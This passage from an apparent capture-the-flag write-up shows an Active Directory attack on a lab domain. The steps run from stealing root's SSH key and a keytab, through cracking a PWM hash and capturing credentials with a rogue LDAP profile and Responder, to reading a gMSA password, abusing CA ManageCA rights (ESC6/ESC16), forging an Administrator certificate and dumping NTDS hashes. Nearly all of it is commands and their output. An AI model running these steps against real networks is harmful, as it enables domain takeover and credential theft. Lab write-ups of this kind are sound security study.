hGRBA2IBY0giAdgZmsH4YS73Cc69UHtpbJ1QdfQR+qBOyClrTuEyL2lGeYmyG8/eN0Ukv3
SL9sIsg8jjvlyCeG6omd3H4liAbuNUsQWJsocKsK4VmVhzgLziTD/sVu8Kbkcc9/sPa9F6
N6f5Ox0ma1WXkAAAAIcm9vdEB3ZWIBAgM=
-----END OPENSSH PRIVATE KEY-----
```

The root user also has a private key, which means i can get a more stable session

```python
nano id_rsa_root

chmod 600 id_rsa_root
```

So ill copy it and set the correct permissions

```python
ssh root@dc01.fries.htb -i id_rsa_root      
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Aug 18 11:33:45 PM UTC 2026

  System load:  0.08               Processes:             184
  Usage of /:   66.9% of 13.67GB   Users logged in:       1
  Memory usage: 56%                IPv4 address for eth0: 192.168.100.2
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Nov 19 19:37:00 2025
root@web:~#
```

I now have a more stable and persistent connection on the root user over SSH

## Initial access on the domain as the `web$` user

https://github.com/sosdave/KeyTabExtract

```python
scp -i ../id_rsa_root root@dc01.fries.htb:/etc/krb5.keytab .
krb5.keytab
```

First ill transfer the keytab file from the target to my machine

```python
python3 keytabextract.py krb5.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : FRIES.HTB
	SERVICE PRINCIPAL : WEB$/
	NTLM HASH : 61e3599900d7a81c373bcbaaa755bdb2
	AES-256 HASH : c2f611ea95c0890050a5025a0421faa8efee4d525dfabbeb14c25d456a770989
	AES-128 HASH : 8a735f6c676faf8c27fef46fe7209a81
```

I now have a user i can use to authenticate to the domain

```python
nxc smb dc01.fries.htb -u 'web$' -H '61e3599900d7a81c373bcbaaa755bdb2'
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.72   445    DC01             [+] fries.htb\web$:61e3599900d7a81c373bcbaaa755bdb2
```

Now i can do some domain enumeration

## Domain enumeration as `web$`

```python
nxc smb dc01.fries.htb -u 'web$' -H '61e3599900d7a81c373bcbaaa755bdb2' --shares
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.72   445    DC01             [+] fries.htb\web$:61e3599900d7a81c373bcbaaa755bdb2 
SMB         10.129.244.72   445    DC01             [*] Enumerated shares
SMB         10.129.244.72   445    DC01             Share           Permissions     Remark
SMB         10.129.244.72   445    DC01             -----           -----------     ------
SMB         10.129.244.72   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.244.72   445    DC01             C$                              Default share
SMB         10.129.244.72   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.244.72   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.244.72   445    DC01             SYSVOL          READ            Logon server share
```

Read access on default shares

```python
nxc smb dc01.fries.htb -u 'web$' -H '61e3599900d7a81c373bcbaaa755bdb2' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
gMSA_CA_prod$
w.earl
d.cooper
b.horne
b.briggs
s.johnson
j.hurley
h.truman
d.lynch
l.palmer
l.johnson
h.jennings
svc_infra
WEB$
d.wilson
m.hannigan
```

Ill also grab the full userlist

There are no kerberoastable users

No passwords stored in user descriptions

No access on WINRM

Nothing interesting on the current user in bloodhound 

## Credentials found in PWM configuration

Now i have root access on the system that runs the service i can get the hash

```python
root@web:~/scripts/pwm/config# cat backup/PwmConfiguration.xml-backup | grep 'configPasswordHash'
        <property key="configPasswordHash">$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG</property>
```

After some domain enumeration and not finding anything, ill return to the root shell over SSH, and i find the password hash of a user on PWM

```python
hashcat '$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG' /usr/share/wordlists/rockyou.txt -m 3200

$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG:rockon!
```

After some research on the hash types PWM uses i see mode 3200 works

So this will get me access to the PWM instance but first i want to try it on the domain!

So this password does work for any user on the domain!

## Capturing plaintext password by abusing LDAP profiles

But the password does get me access to the Config editor and manager

![Screenshot](images/fries/pasted-image-20260818185020.webp)

From past experience i know i can exploit this

![Screenshot](images/fries/pasted-image-20260818185335.webp)

So i can abuse the LDAP profiles by adding one that connects back to responder

```python
sudo responder -I tun0
```

So first ill start responder

![Screenshot](images/fries/pasted-image-20260818190005.webp)

Ill add an LDAP profile for my server

![Screenshot](images/fries/pasted-image-20260818190024.webp)

Then with responder running ill test the connection

![Screenshot](images/fries/pasted-image-20260818190102.webp)

```python
svc_infra:m6tneOMAh5p0wQ0d
```

I have captured the plaintext creds

## Compromising `svc_infra`

```python
nxc smb dc01.fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d'             
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.72   445    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d
```

This user is now compromised!

![Screenshot](images/fries/pasted-image-20260818190305.webp)

This user can read the gMSA password of `gmsa_ca_prod$` account

## Compromising `gmsa_ca_prod$`

```python
nxc ldap dc01.fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' --gmsa
LDAP        10.129.244.72   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.244.72   389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
LDAP        10.129.244.72   389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.244.72   389    DC01             Account: gMSA_CA_prod$        NTLM: 1be70aa7a632cd28036169c6038a92a5     PrincipalsAllowedToReadPassword: svc_infra
```

Ill grab the NTLM

```python
nxc smb dc01.fries.htb -u 'gMSA_CA_prod$' -H '1be70aa7a632cd28036169c6038a92a5'  
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.72   445    DC01             [+] fries.htb\gMSA_CA_prod$:1be70aa7a632cd28036169c6038a92a5
```

This user is now compromised!

This new user part of the remote management group

![Screenshot](images/fries/pasted-image-20260818190624.webp)

And since this is a CA account, its a good idea to try and enumerate ADCS attacks

## Domain Admin via ADCS

```python
certipy-ad find -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -dc-host dc01.fries.htb -dc-ip 10.129.244.72 -stdout -enabled -vulnerable
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fries-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fries-DC01-CA'
[*] Checking web enrollment for CA 'fries-DC01-CA' @ 'DC01.fries.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fries-DC01-CA
    DNS Name                            : DC01.fries.htb
    Certificate Subject                 : CN=fries-DC01-CA, DC=fries, DC=htb
    Certificate Serial Number           : 26117C1FFA5705AF443B7E82E8C639A9
    Certificate Validity Start          : 2025-11-18 05:39:18+00:00
    Certificate Validity End            : 3024-05-19 14:11:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : FRIES.HTB\Administrators
      Access Rights
        ManageCa                        : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
        Enroll                          : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Users
                                          FRIES.HTB\Domain Computers
                                          FRIES.HTB\Authenticated Users
        ManageCertificates              : FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
    [+] User Enrollable Principals      : FRIES.HTB\Domain Computers
                                          FRIES.HTB\Authenticated Users
                                          FRIES.HTB\Domain Users
                                          FRIES.HTB\gMSA_CA_prod
    [+] User ACL Principals             : FRIES.HTB\gMSA_CA_prod
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```

I also have ManageCa rights, which means i should be able to add myself as an enrollee subject to templates
### ESC7

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca

```python
certipy-ad find -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -dc-host dc01.fries.htb -dc-ip 10.129.244.72 -stdout -enabled

3
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : fries-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-05-19T14:10:46+00:00
    Template Last Modified              : 2025-05-19T14:10:46+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : FRIES.HTB\Enterprise Admins
        Full Control Principals         : FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
        Write Owner Principals          : FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
        Write Dacl Principals           : FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
        Write Property Enroll           : FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
```

So the template recommended in the certipy is also enabled, so i want have to enable it

But i am not an enrollee, but since i have ManageCa perms i should be able to add myself as a officer

```python
certipy-ad ca -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -ns '10.129.244.72' -target 'dc01.fries.htb' -ca 'fries-DC01-CA' -add-officer 'gMSA_CA_prod$' -target 10.129.244.72 -debug
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '10.129.244.72'
[+] DC IP: None
[+] DC Host: 'FRIES.HTB'
[+] Target IP: '10.129.244.72'
[+] Remote Name: '10.129.244.72'
[+] Domain: 'FRIES.HTB'
[+] Username: 'GMSA_CA_PROD$'
[+] Trying to resolve 'FRIES.HTB' at '10.129.244.72'
[+] Authenticating to LDAP server using NTLM authentication
[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
[+] Using LDAP channel binding for NTLM authentication
[+] LDAP NTLM authentication successful
[+] Bound to ldaps://10.129.244.72:636 - ssl
[+] Default path: DC=fries,DC=htb
[+] Configuration path: CN=Configuration,DC=fries,DC=htb
[+] Trying to get DCOM connection for: '10.129.244.72'
[*] Successfully added officer 'gMSA_CA_prod$' on 'fries-DC01-CA'
```

So first ill add myself as an officer

The template is already enabled, so i can skip that step

```python
certipy-ad req -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -dc-ip '10.129.244.72' -target 'dc01.fries.htb' -ca 'fries-DC01-CA' -template 'SubCA' -upn 'Administrator@fries.htb' -debug 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '10.129.244.72'
[+] DC IP: '10.129.244.72'
[+] DC Host: 'FRIES.HTB'
[+] Target IP: None
[+] Remote Name: 'dc01.fries.htb'
[+] Domain: 'FRIES.HTB'
[+] Username: 'GMSA_CA_PROD$'
[+] Trying to resolve 'dc01.fries.htb' at '10.129.244.72'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
[*] Request ID is 45
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '45.key'
[+] Attempting to write data to '45.key'
[+] Data written to '45.key'
[*] Wrote private key to '45.key'
[-] Failed to request certificate
```

Ill then submit a request and retrieve the key

```python
certipy-ad ca  -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -ca fries-DC01-CA -target 10.129.244.72 -issue-request 45 -dc-ip 10.129.244.72 -dc-host dc01.fries.htb -debug
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.244.72'
[+] DC IP: '10.129.244.72'
[+] DC Host: 'dc01.fries.htb'
[+] Target IP: '10.129.244.72'
[+] Remote Name: '10.129.244.72'
[+] Domain: 'FRIES.HTB'
[+] Username: 'GMSA_CA_PROD$'
[+] Trying to get DCOM connection for: '10.129.244.72'
[-] Access denied: Insufficient permissions to issue certificate
```

But i am getting an error, im still not sure on the exact reason, but its clear its not just as simple as exploiting ESC7

However, since i have ManageCa i might be able to modify ADCS in some way

I also have access over WINRM, so i should be able to directly interact with the certsvc service 

### Using ManageCa privileges to enable ESC6 and ESC16

So i cant abuse ESC7 in the normal way, but i still have ManageCa which means i can make changes to ADCS

https://bloodhound.specterops.io/resources/edges/manage-ca#4-enable-esc6-flag-editf_attributesubjectaltname2

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Certify.exe

Ill upload it to WINRM

```python
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> .\Certify.exe manage-ca --ca "DC01.fries.htb\fries-DC01-CA" --esc6

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v2.0.0

[*] Action: Manage a certificate authority

[*] Attempting to toggle EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6) on the CA.
[*] The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is not set, toggling it on.
[*] Successfully set the EditFlags configuration on the CA.

[*] Attempting to restart the CA service.
[*] Successfully stopped the CA service.
[*] Successfully restarted the CA service.

Certify completed in 00:00:00.6022747
```

Now the flag has been set

```python
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> Restart-Service certsvc -Force
```

Ill restart the certsvc service

```python
    [!] Vulnerabilities
      ESC6                              : Enrollee can specify SAN.
      ESC7                              : User has dangerous permissions.
    [*] Remarks
      ESC6                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

And now re running certipy i see that its now vulnerable to ESC6

However i still cannot get this to work, after some research modern AD networks require you to enable both esc6 and esc16

```python
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> .\Certify.exe manage-ca --ca "DC01.fries.htb\fries-DC01-CA" --esc16

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v2.0.0

[*] Action: Manage a certificate authority

[*] Attempting to toggle EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6) on the CA.
[*] The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is not set, toggling it on.
[*] Successfully set the EditFlags configuration on the CA.

[*] Attempting to toggle szOID_NTDS_CA_SECURITY_EXT in the DisableExtensionList attribute (ESC16) on the CA.
[*] The szOID_NTDS_CA_SECURITY_EXT extension does not exist in DisableExtensionList, adding it.
[*] Successfully set the DisableExtensionList configuration on the CA.

[*] Attempting to restart the CA service.
[*] Successfully stopped the CA service.
[*] Successfully restarted the CA service.

Certify completed in 00:00:00.6050693
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents>
```

Now that is enabled

```python
    [!] Vulnerabilities
      ESC6                              : Enrollee can specify SAN.
      ESC7                              : User has dangerous permissions.
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC6                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

Now its all setup 

```python
certipy-ad req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' -target dc01.fries.htb -dc-ip 10.129.244.72 -dc-host dc01.fries.htb -target-ip 10.129.244.72 -ca 'fries-DC01-CA' -template 'User' -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500' -debug
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.244.72'
[+] DC IP: '10.129.244.72'
[+] DC Host: 'dc01.fries.htb'
[+] Target IP: '10.129.244.72'
[+] Remote Name: 'dc01.fries.htb'
[+] Domain: 'FRIES.HTB'
[+] Username: 'SVC_INFRA'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
[*] Request ID is 47
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fries.htb'
[+] Found SID in SAN URL: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Now ill use thiis certificate to extract the NTLM

```python
faketime -f +7h certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.244.72 -debug
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
[+] Nameserver: '10.129.244.72'
[+] DC IP: '10.129.244.72'
[+] DC Host: ''
[+] Target IP: '10.129.244.72'
[+] Remote Name: '10.129.244.72'
[+] Domain: ''
[+] Username: ''
[*] Certificate identities:
[*]     SAN UPN: 'administrator@fries.htb'
[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
[+] Found SID in SAN URL: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[+] Sending AS-REQ to KDC fries.htb (10.129.244.72)
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[+] Attempting to write data to 'administrator.ccache'
[+] Data written to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

Now i have the NTLM hash for the user

```python
nxc smb dc01.fries.htb -u Administrator -H 'a773cb05d79273299a684a23ede56748' --ntds
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.72   445    DC01             [+] fries.htb\Administrator:a773cb05d79273299a684a23ede56748 (Pwn3d!)
SMB         10.129.244.72   445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.244.72   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748:::
SMB         10.129.244.72   445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.244.72   445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ce86e3842ffc9a775d2a356c60eac9c3:::
SMB         10.129.244.72   445    DC01             fries.htb\w.earl:2613:aad3b435b51404eeaad3b435b51404ee:ee2e704309cf4a26a4686a9d56489bf4:::
SMB         10.129.244.72   445    DC01             fries.htb\d.cooper:2614:aad3b435b51404eeaad3b435b51404ee:50232f4444bc8fd6cfda4b3e1b715663:::
SMB         10.129.244.72   445    DC01             fries.htb\b.horne:2615:aad3b435b51404eeaad3b435b51404ee:9cead10842a333fa049d4bc65cc55865:::
SMB         10.129.244.72   445    DC01             fries.htb\b.briggs:2616:aad3b435b51404eeaad3b435b51404ee:cf1ec47b3cf4e869d5c8b7138c07bae4:::
SMB         10.129.244.72   445    DC01             fries.htb\s.johnson:2617:aad3b435b51404eeaad3b435b51404ee:6e34ce1188061a026b8fb680d4a0ec9e:::
SMB         10.129.244.72   445    DC01             fries.htb\j.hurley:2618:aad3b435b51404eeaad3b435b51404ee:e3fa3f2a91ee7f8451fd1d0338e65355:::
SMB         10.129.244.72   445    DC01             fries.htb\h.truman:2619:aad3b435b51404eeaad3b435b51404ee:f9ac987d61cb1cf5649f82bc52778c3e:::
SMB         10.129.244.72   445    DC01             fries.htb\d.lynch:2620:aad3b435b51404eeaad3b435b51404ee:327641bc7f835d4be5f7dd5e602e8df4:::
SMB         10.129.244.72   445    DC01             fries.htb\l.palmer:2621:aad3b435b51404eeaad3b435b51404ee:1d44c7eb22b8c76b072f83fb07a56af3:::
SMB         10.129.244.72   445    DC01             fries.htb\l.johnson:2622:aad3b435b51404eeaad3b435b51404ee:a191c320a175dbe32cba7c58ede45ec7:::
SMB         10.129.244.72   445    DC01             fries.htb\h.jennings:2623:aad3b435b51404eeaad3b435b51404ee:b36354d4de8b39c31e13c950e969fbab:::
SMB         10.129.244.72   445    DC01             fries.htb\svc_infra:3601:aad3b435b51404eeaad3b435b51404ee:3bf3a1986ea9ae5b54a5725847a2adcc:::
SMB         10.129.244.72   445    DC01             fries.htb\d.wilson:5601:aad3b435b51404eeaad3b435b51404ee:b97330f3044941930b3667fa9888d5e3:::
SMB         10.129.244.72   445    DC01             fries.htb\m.hannigan:5602:aad3b435b51404eeaad3b435b51404ee:e2c1ce7011b7564d594367b06ca2428c:::
SMB         10.129.244.72   445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ba380858b63611eaadb906e8e5b55e3e:::
SMB         10.129.244.72   445    DC01             gMSA_CA_prod$:1104:aad3b435b51404eeaad3b435b51404ee:1be70aa7a632cd28036169c6038a92a5:::
SMB         10.129.244.72   445    DC01             FRIES.HTB\WEB$:4601:aad3b435b51404eeaad3b435b51404ee:61e3599900d7a81c373bcbaaa755bdb2:::
SMB         10.129.244.72   445    DC01             [+] Dumped 20 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_10.129.244.72_2026-08-19_181453.ntds of which 17 were added to the database
SMB         10.129.244.72   445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         10.129.244.72   445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.129.244.72_2026-08-19_181453.ntds | cut -d ':' -f1
```

Full domain compromise

```python
evil-winrm -i dc01.fries.htb -u Administrator -H 'a773cb05d79273299a684a23ede56748'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```python
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

Domain Admin!
